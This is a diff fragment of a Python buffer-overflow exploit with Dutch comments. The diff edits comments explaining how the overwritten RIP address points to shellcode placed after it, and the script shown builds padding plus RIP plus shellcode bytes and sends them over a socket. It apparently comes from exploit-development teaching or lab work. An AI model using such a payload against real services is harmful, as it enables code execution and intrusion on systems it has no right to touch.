@@ -73,14 +73,14 @@ b"\xca\x93\x72\x51\x9d\xdb\xec\x92\x54\x81\xe1\xf4"
 b"\x74\xde\xa4\x17\x94\xf9\x0c"
 )
 
-# RIP is het adres voor de instruction pointer. Die staat aan het begin van de
-# buffer + de lengte van de buffer + 8 bytes van het RIP adres zelf. Daar moet
-# RIP naar wijzen.
+# RIP is het adres voor de instruction pointer. Die staat aan: (het begin van de
+# buffer + de lengte van de buffer + 8 bytes van het RIP adres zelf). Daar moet
+# RIP naar wijzen. Het is het volgende adres, daar zetten we de shellcode neer.
 
 RIP = struct.pack("Q", (start_buf+len(padding)+8))
 print(RIP)
 
-# De payload wordt neergezet op het adres van RIP.
+# De payload plus RIP waarde + de shellcode worden in geheugen geplaatst.
 
 payload = padding + RIP + shellcode
 s.send(payload)
